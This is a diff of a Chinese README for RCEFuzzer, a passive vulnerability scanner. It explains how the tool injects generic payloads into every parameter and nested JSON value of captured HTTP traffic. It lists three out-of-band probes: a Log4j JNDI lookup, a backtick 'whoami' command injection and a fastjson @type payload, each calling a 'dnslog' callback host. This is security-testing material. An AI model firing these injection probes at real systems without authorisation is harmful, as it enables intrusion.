@@ -1,9 +1,42 @@
 # RCEFuzzer
-find your rce
+
 
 ## 下载使用
 
 [https://github.com/TheKingOfDuck/RCEFuzzer/releases/tag/0.5](https://github.com/TheKingOfDuck/RCEFuzzer/releases/tag/0.5)
+
+## 基本介绍
+
+这是一个以fuzz为中心思想的被动扫描工具，多数扫描器的工作逻辑是以已知漏洞去冲目标，然后根据条件判断是否存在这个已知的漏洞；rcefuzzer的工作逻辑是以通用payload去污染目标的参数，然后根据条件判断是否存在未知漏洞。
+
+举个例子，假设被动收集到的流量是
+
+https://www.baidu.com
+```
+POST /sys/customer/list HTTP/1.1
+Host: www.baidu.com
+Content-Length: 23
+Content-Type: application/json;charset=UTF-8
+
+{"key1":"value1","key2":"eyJpbm5lcmtleTEiOiJpbm5lcnZhbHVlMSJ9","id":1,"isLogin":false,"key3":{"innerkey2":"{\"k3\":\"v3\"}"}}
+```
+如果配置了三条通用的payload:
+```
+${jndi:ldap://dnslog/log4j}
+`whoami`.dnslog
+{"@type":"java.net.Inet4Address","val":"dnslog"}
+```
+
+那么rcefuzzer的参数污染模块将对目标发起以下请求：
+
+* 污染key1的值然后分别发包
+* 通用污染key1的值然后分别发包
+* 尝试自动解码，并污染子JSON的innerkey1的值3次然后分别发包
+* 污染key3的值然后分别发包。
+* 污染子JSONinnerkey2的值，然后分别发包。
+* 尝试解析innerkey2，并污染子JSON的k3的值然后分别发包
+
+理论上总的请求量是3*6=18次。这仅是参数污染模块，如果带上其他模块，那请求量可能是50。如果payload写得多点，原流量大一点，那么可能是5000次。
 
 ## 配置说明
 
